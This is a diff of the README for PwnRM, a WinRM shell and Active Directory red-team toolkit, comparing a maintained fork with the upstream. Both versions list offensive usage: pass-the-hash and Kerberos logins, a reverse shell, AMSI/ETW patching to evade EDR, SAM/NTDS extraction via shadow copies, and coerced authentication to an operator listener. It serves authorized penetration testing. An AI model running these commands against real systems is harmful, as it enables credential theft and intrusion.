@@ -1,53 +1,29 @@
-<div align="center">
+# PwnRM
 
-![PwnRM ASCII](src/photos/logo.png)
+PwnRM is a pypsrp-backed WinRM shell and Windows/Active Directory assessment
+toolkit for authorized engagements. This fork repairs the authentication and
+dependency stack, supports Impacket S4U service-ticket ccaches, restores
+PowerShell 5.1 compatibility, and turns previously decorative module options
+into tested behavior.
 
-**Advanced WinRM Post-Exploitation Platform for Windows Active Directory Testing**
+The original project and authorship belong to
+[uziii2208/PwnRM](https://github.com/uziii2208/PwnRM). This maintained fork is
+published at [L0u7r3/PwnRM](https://github.com/L0u7r3/PwnRM).
 
-![GitHub stars](https://img.shields.io/github/stars/uziii2208/PwnRM?style=for-the-badge&color=gold&logo=github)
-[![Hall of Fame](https://img.shields.io/badge/Hall_of_Fame-🏆_h4x0rc-gold?style=for-the-badge&logo=trophy)](HALL_OF_FAME.md)
-![GitHub forks](https://img.shields.io/github/forks/uziii2208/PwnRM?style=for-the-badge&color=blue&logo=github)
-![GitHub issues](https://img.shields.io/github/issues/uziii2208/PwnRM?style=for-the-badge&color=red&logo=github)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=opensourceinitiative)
-![PyPI](https://img.shields.io/pypi/v/pwnrm?style=for-the-badge&color=cyan&logo=pypi)
-[![Changelog](https://img.shields.io/badge/Changelog-v2.1.0-blueviolet?style=for-the-badge&logo=git)](CHANGELOG.md)
-![Platform](https://img.shields.io/badge/Platform-Cross--Platform-orange?style=for-the-badge&logo=windows)
-[![Tests](https://img.shields.io/badge/Tests-57%20Passed%20(100%25)-brightgreen?style=for-the-badge&logo=pytest)](tests/)
-[![Documentation](https://img.shields.io/badge/Documentation-Complete_Suite-success?style=for-the-badge&logo=readthedocs)](docs/README.md)
+## Installation
 
-An operator-grade WinRM execution and red team platform for authorized Active Directory security assessments (2026–2027 TTPs): in-memory VSS extraction, coerced authentication suite, Windows LAPS & Server 2025 hunting, AD DACL privilege escalation scout, token impersonation, multi-session graph orchestration, in-band SOCKS5 multiplexing, full ADCS ESC1-ESC17+ (incl. WSUS abuse), Diamond Ticket suite, hybrid Entra ID pivoting, polymorphic evasion runtime, in-memory BloodHound collection, and structured loot pipeline - usable as a CLI tool **and** as a Python library.
-
-[Installation](#installation) · [Usage](#usage) · [Commands](#commands) · [Niche Modules](#niche-modules) · [AD Triage](#ad-triage) · [Documentation](docs/README.md) · [Share Scout](#share-scout) · [Session Scout](#session-scout) · [Changelog](CHANGELOG.md) · [Library Usage](#library-usage) · [Troubleshooting](#troubleshooting) · [Disclaimer](#disclaimer) · [Hall Of Fame](HALL_OF_FAME.md)
-
-</div>
-
----
-
-<a id="installation"></a>
-## 📦 Installation
-
-PwnRM supports CPython 3.10 through 3.14. The complete install includes the
-Kerberos/GSSAPI and CredSSP backends used by the corresponding CLI flags.
-
-### Fixed fork (recommended)
+PwnRM supports CPython 3.10 through 3.14.
 
 ```bash
 pipx install 'git+https://github.com/L0u7r3/PwnRM.git'
 
-# Or inside an existing virtual environment
+# Or in a virtual environment
 python -m pip install 'git+https://github.com/L0u7r3/PwnRM.git'
+python -m pip check
 ```
 
-### PyPI (upstream releases)
-
-```bash
-pip install pwnrm
-
-# Update to latest version
-pip install --upgrade pwnrm
-```
-
-### git clone + installer (Kali / Ubuntu / Debian)
+For Debian, Ubuntu, or Kali, the repository installer creates an isolated
+environment under `/opt/pwnrm`:
 
 ```bash
 git clone https://github.com/L0u7r3/PwnRM.git
@@ -55,315 +31,132 @@ cd PwnRM
 sudo bash install.sh
 ```
 
-The installer creates a virtualenv at `/opt/pwnrm` and registers a global `pwnrm` wrapper.
-
-### Manual / Developer Setup
+Developer setup:
 
 ```bash
-git clone https://github.com/L0u7r3/PwnRM.git
-cd PwnRM
-python3 -m venv venv && source venv/bin/activate
-python -m pip install --upgrade pip
-python -m pip install -e .
+python3 -m venv .venv
+. .venv/bin/activate
+python -m pip install -e '.[dev]'
+python -m pytest -q
 python -m pip check
 ```
 
----
-
-<a id="usage"></a>
-## Connection & Authentication Usage
+## Authentication
 
 ```bash
-# 1. Standard Password Authentication
-pwnrm -u Administrator -p 'P@ssw0rd!' 192.168.1.10
+# Password / NTLM
+pwnrm -d CORP -u operator -p 'password' dc01.corp.local
 
-# 2. Pass-the-Hash (NTLM Hash)
-pwnrm -u Administrator -H :aad3b435b51404eeaad3b435b51404ee dc01.corp.local
+# Pass-the-hash; accepts NT or LM:NT
+pwnrm -d CORP -u operator -H 31d6cfe0d16ae931b73c59d7e0c089c0 dc01
 
-# 3. Kerberos Authentication (ccache / KRB5CCNAME)
-pwnrm -u administrator@CORP.LOCAL -k --ccache /tmp/admin.ccache dc01.corp.local
+# Kerberos ccache
+pwnrm -k --ccache /tmp/operator.ccache dc01.corp.local
 
-# Impacket S4U/constrained-delegation service tickets are supported directly.
-# Run PwnRM under faketime when the operator and DC clocks differ materially.
-pwnrm -k --ccache 'Administrator@TERMSRV_DC01@CORP.LOCAL.ccache' DC01
+# Impacket S4U service-ticket-only ccache (TERMSRV, WSMAN, HTTP, etc.)
+pwnrm -k --ccache /tmp/Administrator@TERMSRV_DC01@CORP.LOCAL.ccache DC01
 
-# 4. Mutual TLS Client Certificate (ADCS ESC1 / ESC9 / Shadow Credentials)
-pwnrm -u administrator@CORP.LOCAL --pfx admin.pfx --pfx-pass secret https://dc01:5986
+# CredSSP credential delegation
+pwnrm -d CORP -u operator -p 'password' --credssp dc01
 
-# 5. CredSSP (Multi-Hop Credential Delegation)
-pwnrm -u admin -p 'P@ss' --credssp dc01.corp.local
+# Client certificate; --pfx selects HTTPS/5986 by default
+pwnrm --pfx operator.pfx --pfx-pass 'password' dc01
 
-# 6. Dead Reckoning Replay Mode (Replay sequence from session transcript log)
-pwnrm -u admin -p 'P@ss' 192.168.1.10 --replay ~/.pwnrm/pwnrm_1725000000_stdout.log
-
-# 7. Non-Interactive Single Command Execution
-pwnrm -u admin -p 'P@ss' dc01.corp.local -X "whoami /all"
+# Single command
+pwnrm -k --ccache /tmp/operator.ccache DC01 -X 'whoami'
 ```
 
-**Key Flags**: `--port`, `--ssl`, `--timeout`, `--ts`, `--debug`, `--replay`, `-X`. Run `pwnrm -h` for the full list.
+TLS certificates are verified by default. Use `--no-ssl-verify` only when the
+engagement explicitly requires it. If the operator clock differs from the KDC,
+run PwnRM in a correctly synchronized environment; Kerberos clock-skew rules
+still apply.
 
----
+## Interactive commands
 
-<a id="commands"></a>
-## Complete Interactive Shell Commands
+| Command | Implemented behavior |
+| --- | --- |
+| `!session list\|switch\|save\|exec-all` | Session inventory, switching, encrypted same-process metadata snapshot, concurrent command fan-out |
+| `!socks [PORT\|stop\|status]` | Direct local RFC 1928 CONNECT proxy; outbound connections originate from the operator host |
+| `!portfwd LPORT RHOST:RPORT` | Direct operator-side TCP forward; use `list` or `stop <ID\|all>` to manage it |
+| `!module list\|run <name>` | Built-in and permission-checked external module registry |
+| `!adcs` | Enterprise CA health, template publication/prerequisite/ACL, and optional WSUS policy triage |
+| `!kerberos` | SPN/AS-REP candidate, RBCD, dMSA, and Diamond prerequisite reconnaissance |
+| `!entra [-s]` | Entra join/PRT status plus accessible WAM/Azure cache-path inventory |
+| `!creds` | Vault metadata, DPAPI master-key, browser, history inventory, and current-user DPAPI unprotect |
+| `!laps` | Legacy and modern Windows LAPS attribute query, including encrypted/DSRM metadata |
+| `!acl` | Targeted or Tier-0 AD DACL inspection |
+| `!token` | Current privilege and process-token identity inventory |
+| `!bloodhound` | AD graph-oriented reconnaissance summary by collection method |
+| `!lateral` | Bounded IPv4 subnet service scan with optional WSMan authentication probe |
+| `!vss [sam\|ntds]` | WMI-created shadow copy and remote temporary staging of database/hive files |
+| `!coerce --listener HOST` | Outbound WebDAV and/or SMB UNC authentication probe as the current remote identity |
+| `!evasion` / `!amsi` | Selected AMSI/ETW in-process patching and EDR/AV inventory |
+| `!adtriage`, `!shares`, `!sessions`, `!sysinfo` | PowerShell 5.1-compatible host and AD reconnaissance |
+| `!upload`, `!download` | SHA-256-verified file transfer; directory downloads are zipped remotely |
+| `!psrun`, `!netrun` | HTTP(S) or remote-path in-memory PowerShell/.NET execution |
+| `!revshell IPv4 PORT` | Raw IPv4 reverse command shell |
+| `!playbook` | Validated JSON/built-in sequential automation with conditions and cleanup hooks |
+| `!loot`, `!opsec`, `!log`, `!stoplog` | Local artifact inventory, jitter profile, and transcript controls |
 
-PwnRM v2.1 provides 13 specialized built-in modules alongside core platform commands:
+Run `pwnrm -h` and `help` inside the shell for the current syntax.
 
-| Category | Command | Description |
-| :--- | :--- | :--- |
-| **Core Platform** | `!session [list, switch, save, exec-all]` | Multi-session manager & jump graph orchestrator |
-| | `!socks [PORT, stop, status]` | In-band SOCKS5 proxy multiplexer (default: 1080) |
-| | `!portfwd [LPORT RHOST:RPORT, list, stop]` | Local & remote port forwarding multiplexer |
-| | `!module [list, run <name>]` | Extensible plugin subsystem & module runner |
-| | `!loot` | Structured credential & artifact inventory viewer |
-| | `!opsec [stealth, balanced, aggressive, hybrid-cloud]` | Dynamic execution jitter & OPSEC profile switcher |
-| | `!playbook [--list, --run <name>]` | Declarative red team playbook runner |
-| **Identity & AD Abuse** | `!adcs [-q, --template <T>, --wsus]` | Full ADCS ESC1-ESC17+ engine & certificate/WSUS triage |
-| | `!kerberos [--roast, --asrep, --dmsa, --diamond]` | Advanced Kerberos suite (AES roasting, dMSA/BadSuccessor) |
-| | `!entra [-s]` | Hybrid Entra ID / Azure AD PRT pivot & join state recon |
-| | `!creds [--vault, --dpapi, --history]` | Deep credential & token artifact hunter |
-| | `!laps [-a, --encrypted]` | Windows LAPS hunter (Legacy ms-Mcs-AdmPwd & Server 2025 msLAPS) |
-| | `!acl [--target <T>, --tier0]` | Active Directory DACL & Tier-0 privilege escalation scout |
-| | `!token [--list, --privs, --elevate]` | Process token hunter & in-memory impersonation suite |
-| | `!bloodhound [-c <methods>]` | In-memory Active Directory graph collector (BloodHound CE) |
-| | `!lateral [--subnet <s>]` | Subnet scout & lateral movement engine |
-| **In-Memory & Staging** | `!vss [sam\|ntds] [--drive C:]` | In-memory VSS shadow copy hive extractor (SAM/SYSTEM/NTDS) |
-| | `!coerce --listener <IP> [--method M]` | Coerced authentication engine (WebDAV, MS-RPRN, MS-EFSR, DFS) |
-| | `!evasion [--edr, --amsi, --etw]` | Polymorphic AMSI/ETW memory patching & EDR scout |
-| | `!download RPATH [LPATH]` | Pull file/dir from target (dirs auto-zipped) |
-| | `!upload [-xor] LPATH [RPATH]` | Push file; `-xor` for encrypted staging |
-| | `!amsi` | Patch `AmsiScanBuffer` in the remote process (polymorphic) |
-| | `!psrun [-xor] URL` | Execute remote PowerShell via obfuscated ScriptBlock |
-| | `!netrun [-xor] URL [ARG..]` | Load & invoke remote .NET assembly in-memory |
-| | `!revshell IP PORT` | Raw Winsock reverse shell (full I/O, no cmd logging) |
-| **Triage & Snapshot** | `!adtriage [-q]` | Built-in Active Directory enumeration engine |
-| | `!shares [-q] [HOST ..]` | SMB share scout - UNC access, ACLs, SYSVOL GPP cPassword |
-| | `!sessions [-q]` | Session & network snapshot - logon sessions, tickets, TCP |
-| | `!sysinfo` | OS / AV / hotfix / local-admin snapshot |
-| | `!log` / `!stoplog` | Toggle session transcript |
-| | `exit` / `quit` / `Ctrl+D` | Close session (`Ctrl+C` interrupts running commands) |
+## Important capability boundaries
 
----
+These distinctions are deliberate and covered by regression tests:
 
-<a id="niche-modules"></a>
-## Niche Operator Modules & TTPs [v2.1.0]
+- `!socks` and `!portfwd` are direct local proxies. They do not multiplex TCP
+  through PSRP and therefore do not provide a target-side network pivot.
+- `!coerce` performs real WebDAV/SMB UNC access probes. It does not implement
+  MS-RPRN, MS-EFSR/PetitPotam, or MS-DFSNM RPC calls.
+- `!kerberos` enumerates candidates and prerequisites. It does not request
+  roastable tickets or forge Diamond tickets.
+- `!adcs` triages CA/template conditions and access controls. It does not claim
+  complete ESC1–ESC17 exploit validation and does not request certificates.
+- `!bloodhound` emits an operator-readable graph reconnaissance summary, not a
+  BloodHound CE import archive.
+- `!token` inventories tokens and privileges; it does not impersonate another
+  identity or elevate the session.
+- `!entra` locates accessible authentication artifacts but does not decrypt or
+  extract a Primary Refresh Token.
+- `!vss` creates no `vssadmin.exe`/`ntdsutil.exe` process, but it does stage
+  copied hives or `ntds.dit` in a temporary directory on the remote host.
+- `WebSocketTransport` is retained only as an import-compatible placeholder and
+  fails explicitly. Supported runspaces use HTTP(S) through pypsrp.
 
-### 1. In-Memory VSS Shadow Copy Hive Extractor (`!vss`)
-Extracts locked credentials databases (`SAM`, `SYSTEM`, `SECURITY`, and `NTDS.dit`) directly via **WMI / CIM COM reflection (`[wmiclass]"Win32_ShadowCopy"`)**.
-- **Anti-EDR Design**: Does **not** invoke `vssadmin.exe` or `ntdsutil.exe` (which immediately trigger EDR process-creation alerts).
-- **Forensic Hygiene**: Instantly calls `.Delete()` on the created shadow copy upon extraction, leaving zero residual shadow copies on disk.
-- **Commands**:
-  ```powershell
-  !vss                    # Auto-select SAM or NTDS based on the host role
-  !vss sam                # Force SAM, SYSTEM, and SECURITY extraction
-  !vss ntds               # Force active NTDS.dit and SYSTEM extraction
-  !vss sam --drive E:     # Extract from an alternate volume
-  ```
+## Transfer and staging notes
 
-The created shadow copy is always deleted in a `finally` block. `--sam` and
-`--ntds` remain accepted as aliases for compatibility.
+Uploads and downloads use SHA-256 integrity verification and configurable
+256 MiB defaults (`PWNRM_MAX_UL`, `PWNRM_MAX_DL`). Local downloads refuse
+symbolic-link destinations and are created mode `0600` on POSIX.
 
-### 2. Coerced Authentication Engine (`!coerce`)
-Triggers outbound authentication from the target machine account or server to an operator listener (Responder / `ntlmrelayx`), supporting 4 distinct coercion methods:
-1. **WebDAV HTTP UNC Paths**: `\\listener@80\share\dummy.txt` forces the WebClient service to authenticate over HTTP instead of SMB — **bypassing SMB signing** and enabling direct relaying to ADCS ESC8 Web Enrollment.
-2. **MS-RPRN Print Spooler**: In-memory RPC trigger targeting `\pipe\spoolss`.
-3. **MS-EFSR PetitPotam**: In-memory RPC trigger targeting `\pipe\efsrpc` and `\pipe\lsarpc`.
-4. **MS-DFSNM**: In-memory RPC trigger targeting `\pipe\netdfs`.
-- **Commands**:
-  ```powershell
-  !coerce --listener 10.10.14.5                    # WebDAV HTTP coercion (default, port 80)
-  !coerce --listener 10.10.14.5 --method spooler  # MS-RPRN Print Spooler coercion
-  !coerce --listener 10.10.14.5 --method efs      # MS-EFSR PetitPotam coercion
-  !coerce --listener 10.10.14.5 --method all      # Dispatch all coercion vectors
-  ```
+`!upload -xor` uses a random key generated for the current PwnRM process. The
+corresponding `!psrun -xor` or `!netrun -xor` must run in that same process;
+starting another PwnRM instance creates a different key.
 
-### 3. Windows LAPS & Server 2025 Password Hunter (`!laps`)
-Performs 100% in-memory LDAP directory queries for local administrator passwords managed by Windows LAPS:
-- **Legacy LAPS**: `ms-Mcs-AdmPwd` (cleartext password) and `ms-Mcs-AdmPwdExpirationTime`.
-- **Modern Server 2025 / Windows 11 LAPS**: `msLAPS-Password` (cleartext), `msLAPS-EncryptedPassword`, `msLAPS-EncryptedDSRMPassword`, and `msLAPS-PasswordHistory`.
-- **Commands**:
-  ```powershell
-  !laps                 # Query all cleartext LAPS passwords
-  !laps -a              # Enumerate all domain computers and LAPS status
-  !laps --encrypted     # Display and catalog modern Server 2025 encrypted LAPS blobs
-  ```
-
-### 4. Active Directory DACL & Privilege Escalation Scout (`!acl`)
-Audits Discretionary Access Control Lists (DACLs) on Tier-0 and high-value objects (`AdminSDHolder`, `Domain Admins`, `Domain Controllers`, `krbtgt`, GPOs).
-- Flags exploitable rights: `GenericAll`, `WriteDacl` (modify ACL to gain full control), `WriteOwner` (take ownership), `GenericWrite`, and `User-Force-Change-Password` (Extended Right GUID `00299570-246d-11d0-a768-00aa006e0529`).
-- **Commands**:
-  ```powershell
-  !acl                                # Audit standard Tier-0 objects
-  !acl --target "Domain Admins"       # Inspect DACLs on specific target group/user
-  !acl --tier0                        # Deep scan across all Tier-0 OUs and GPOs
-  ```
-
-### 5. Process Token Hunter & In-Memory Impersonation (`!token`)
-Inspects token privileges and accessible process tokens across active user sessions.
-- Evaluates high-impact rights: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTcbPrivilege`.
-- Discovers SYSTEM and Administrator processes suitable for token duplication or named pipe impersonation without dropping binaries to disk.
-- **Commands**:
-  ```powershell
-  !token                 # Run privilege audit and process token inventory
-  !token --privs         # Detailed exploitation guide for enabled privileges
-  !token --list          # Full process token user mapping
-  ```
-
----
-
-<a id="ad-triage"></a>
-## Identity, ADCS & Kerberos Exploitation
-
-### Full ADCS Engine (`!adcs`)
-Comprehensive Active Directory Certificate Services audit covering **ESC1 through ESC17+**:
-- **ESC1 / ESC2**: Enrollee supplies SAN (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1`) with Client Authentication / Any Purpose EKUs.
-- **ESC3 / ESC4**: Certificate Request Agent (`1.3.6.1.4.1.311.20.2.1`) and vulnerable template ACLs.
-- **ESC6 / ESC7**: CA `EDITF_ATTRIBUTESUBJECTALTNAME2` registry flag & vulnerable CA permissions.
-- **ESC17 (WSUS & Code Signing Policy Abuse)**: Detects Code Signing (`1.3.6.1.5.5.7.3.3`) and Windows Update templates combined with WSUS client registry policy `AcceptTrustedPublisherCerts = 1` and cleartext HTTP `WUServer` endpoints.
-
-### Advanced Kerberos Suite (`!kerberos`)
-- **AES Kerberoasting**: Requests TGS tickets with AES256-CTS-HMAC-SHA1-96 priority (for modern RC4-deprecated AD).
-- **AS-REP Roasting**: Queries accounts with `DONT_REQ_PREAUTH` (`0x400000`).
-- **Diamond Ticket Workflow**: Assists in identity-swap TGT crafting to evade KDC anomaly detection.
-- **Server 2025 dMSA / BadSuccessor**: Inspects Delegated Managed Service Accounts (`msDS-DelegatedManagedServiceAccount`) and `BadSuccessor` takeover paths.
-
-### Hybrid Entra ID / Cloud Pivot (`!entra`)
-- Evaluates `dsregcmd /status` (`AzureAdJoined`, `DomainJoined`, `EnterpriseJoined`).
-- Identifies Web Account Manager (WAM) token broker caches (`Microsoft.AAD.BrokerPlugin`) and Primary Refresh Token (PRT) artifacts.
-- Extracts Azure CLI (`accessTokens.json`) and Azure PowerShell credential caches.
-
----
-
-<a id="platform-features"></a>
-## Operator Platform Subsystems
-
-### In-Band PSRP SOCKS5 Proxy & Port Forwarding (`!socks`, `!portfwd`)
-- `!socks 1080`: Spawns a local RFC 1928 SOCKS5 proxy multiplexed over existing WinRM PSRP streams — **no listening ports opened on target, zero binary drops**.
-- `!portfwd <LPORT> <RHOST>:<RPORT>`: Direct local port forwarding to internal subnet targets.
-- **Thread Safety**: Hardened with thread-safe mutex locks and socket timeout protection.
-
-### Multi-Session Manager & Jump Graph (`!session`)
-- `!session list`: View all active concurrent target runspaces.
-- `!session switch <id>`: Switch interactive context instantly.
-- `!session exec-all <cmd>`: Non-blocking fan-out command execution across all targets with `[S:X | Host]` output tagging.
-- `!session save`: Ephemeral `Fernet` encrypted session state serialization under `~/.pwnrm/sessions/`.
-
-### Structured Loot Pipeline (`!loot`)
-- Automatically catalogs collected credentials (`credentials.json`), certificates (`.pfx`, `.pem`), Kerberos tickets (`.ccache`), DPAPI master keys, and memory dumps under `~/.pwnrm/loot/<target>/`.
-- Maintains an operational `MANIFEST.json` with SHA-256 integrity checksums and timestamped source commands.
-
-### OPSEC Profiles & Polymorphic AST Obfuscation (`!opsec`)
-- 4 Profiles: `stealth`, `balanced`, `aggressive`, `hybrid-cloud`.
-- **AST Obfuscation**: In `stealth` and `hybrid-cloud` profiles, automatically inserts dynamic backticks inside cmdlet names (e.g. `G`e`t`-`P`r`o`c`e`s`s`) and randomizes whitespace to defeat static ScriptBlockLogging signatures.
-- **CSPRNG Jitter**: Uses `secrets` module for randomized inter-command delay jitter.
-
----
-
-<a id="share-scout"></a>
-## Share Scout (`!shares`)
-`!shares` runs self-contained SMB share enumeration entirely inside the remote PowerShell session - no extra binaries on target. `-q` = quick mode.
-Covers: local share inventory via `Win32_Share` · UNC access testing (read **and** write probe) · ACL quick-wins flagging `Everyone / Authenticated Users` write rights · SYSVOL/NETLOGON sensitive file sweep · **GPP `cPassword` auto-detection** (CVE-2014-1812) · active SMB sessions (`net session`).
-
-<a id="session-scout"></a>
-## Session Scout (`!sessions`)
-`!sessions` runs self-contained active logon session and network snapshot entirely inside the remote PowerShell session. `-q` = quick mode.
-Covers: interactive / remote / service logon sessions via `Win32_LogonSession` · RDP client MRU and saved credentials from registry · Kerberos ticket cache (`klist`) · established TCP connections with process attribution · listening port inventory with service labels (RDP, MSSQL, WinRM, etc.) · named pipe exposure (`lsass`, `spoolss`, `samr`...) · SYSTEM scheduled tasks.
-
----
-
-<a id="library-usage"></a>
-## Python Library Usage
-
-PwnRM can be imported directly into Python automation scripts and custom C2 frameworks:
+## Python API
 
 ```python
-from pwnrm import Runspace, PwnShell, create_transport, argument_parser, SessionManager, Socks5Server
+from pwnrm import Runspace, PwnShell, argument_parser, create_transport
 
-# Parse CLI or programmatic arguments
-args = argument_parser().parse_args(["-u", "admin", "-p", "P@ss", "10.0.0.5"])
+args = argument_parser().parse_args([
+    "-d", "CORP", "-u", "operator", "-p", "password", "dc01"
+])
 
-# Establish MS-PSRP Runspace
-with Runspace(create_transport(args), int(args.timeout)) as rs:
-    shell = PwnShell(rs)
-    
-    # 1. Blocking execution with 1MB OOM safety cap
-    output = shell.run_sync("whoami /all")
-    print(output)
-    
-    # 2. Async streaming execution
-    for record in rs.run_command("Get-Process"):
-        if "stdout" in record:
-            print(record["stdout"], end="")
-            
-    # 3. Spawn In-Band SOCKS5 Proxy
-    socks = Socks5Server(bind_host="127.0.0.1", bind_port=1080)
-    socks.start()
+with Runspace(create_transport(args), timeout=args.timeout) as runspace:
+    shell = PwnShell(runspace, target_info={"host": args.target})
+    result = shell.repl(inputs=["whoami", "!sysinfo"])
+    if result and result.get("status") == "error":
+        raise RuntimeError(result["error"])
 ```
 
----
+See [docs/README.md](docs/README.md) for architecture, module, security, and API
+details.
 
-## Repository Layout
+## Security and authorization
 
-```
-PwnRM/
-├── src/pwnrm/
-│   ├── __init__.py            # Public API & version 2.1.0
-│   ├── __main__.py            # python -m pwnrm entry point
-│   ├── cli.py                 # CLI entry point & Dead Reckoning replay dispatcher
-│   ├── core/                  # Transport, Runspace, SessionMgr, Tunnel, Loot, OPSEC
-│   ├── modules/               # 13 Builtin Modules:
-│   │   ├── adcs.py            # Full ADCS ESC1-ESC17+ & WSUS Engine
-│   │   ├── kerberos.py        # AES Kerberoasting, AS-REP, RBCD, Diamond & dMSA
-│   │   ├── entra.py           # Hybrid Entra ID / Azure AD PRT Pivot
-│   │   ├── creds.py           # Deep Credential & DPAPI Decryption Hunter
-│   │   ├── laps.py            # Windows LAPS (Legacy & Server 2025) Hunter
-│   │   ├── acl.py             # AD DACL & Tier-0 Privilege Escalation Scout
-│   │   ├── token.py           # Process Token Hunter & Impersonation Suite
-│   │   ├── vss.py             # In-Memory VSS Shadow Copy Extractor (SAM/NTDS)
-│   │   ├── coerce.py          # Coerced Auth Engine (WebDAV, MS-RPRN, MS-EFSR)
-│   │   ├── evasion.py         # Polymorphic AMSI/ETW Memory Patching & EDR Scout
-│   │   ├── bloodhound.py      # In-Memory BloodHound CE Graph Collector
-│   │   ├── lateral.py         # Subnet Scout & Lateral Movement Dispatcher
-│   │   └── playbook.py        # Declarative Playbook Automation Engine
-│   ├── shell/                 # PwnShell v2.1 REPL, built-in commands, UI
-│   └── resources/             # adtriage.ps1 · shares.ps1 · sessions.ps1
-├── tests/                     # 57 Automated Unit & Security Regression Tests
-├── docs/                      # Complete 6-Part Deep Technical Documentation Suite
-├── CHANGELOG.md               # Full Release & Security Advisory History
-├── pyproject.toml             # PyPI packaging (v2.1.0)
-├── install.sh                 # Linux installer
-└── requirements.txt
-```
+PwnRM can execute commands, alter a remote PowerShell process, stage sensitive
+files, and trigger outbound authentication. Use it only with explicit written
+authorization and within the agreed Rules of Engagement. Review
+[SECURITY.md](SECURITY.md) before reporting a vulnerability.
 
----
-
-<a id="troubleshooting"></a>
-## Troubleshooting
-
-| Issue | Root Cause | Remediation |
-| :--- | :--- | :--- |
-| `pwnrm: command not found` | PATH not configured | Run `pip install pwnrm` or `sudo bash install.sh` |
-| `No module named 'gssapi'` / `requests_credssp` | Environment was installed with old incomplete metadata | Reinstall with `python -m pip install --upgrade --force-reinstall .` |
-| `SPNEGOProxyNTLM ... unexpected keyword argument 'cbt'` | Broken v2.1.0 transport constructor | Upgrade to this revision; pinning Impacket does not fix the PwnRM call site |
-| `KRB_AP_ERR_SKEW` | Clock desynchronization with KDC | Run `sudo ntpdate <DC_IP>` or configure chrony |
-| WinRM connection refused (5985/5986) | PSRemoting disabled on target | On target: `Enable-PSRemoting -Force` |
-| AMSI catches remote payloads | Strict runtime ScriptBlock inspection | Run `!evasion` or `!amsi` first, or stage via `!upload -xor` |
-| Download stream fails integrity check | Wire corruption / Base64 truncation | Verify WinRM connection MTU or use `-ssl` for TLS transport |
-
----
-## Disclaimer
-
-> [!IMPORTANT]
-> PwnRM is designed for **authorized** security testing, red-team engagements, and educational research only. You must have explicit written authorization (Rules of Engagement / signed scope) before executing PwnRM against any target infrastructure. The authors assume no liability for misuse.
-
-## Credits & License
-
-- **Author**: **uziii2208**
-- **Underlying Protocol Libraries**: Built upon [Impacket](https://github.com/fortra/impacket) & [pypsrp](https://github.com/jborean93/pypsrp).
-- **License**: MIT — see [LICENSE](LICENSE.md).
-
-<div align="center">
-
-**ENJOY YOUR MEAL.** 
-
-</div>
+PwnRM is MIT licensed. See [LICENSE.md](LICENSE.md).
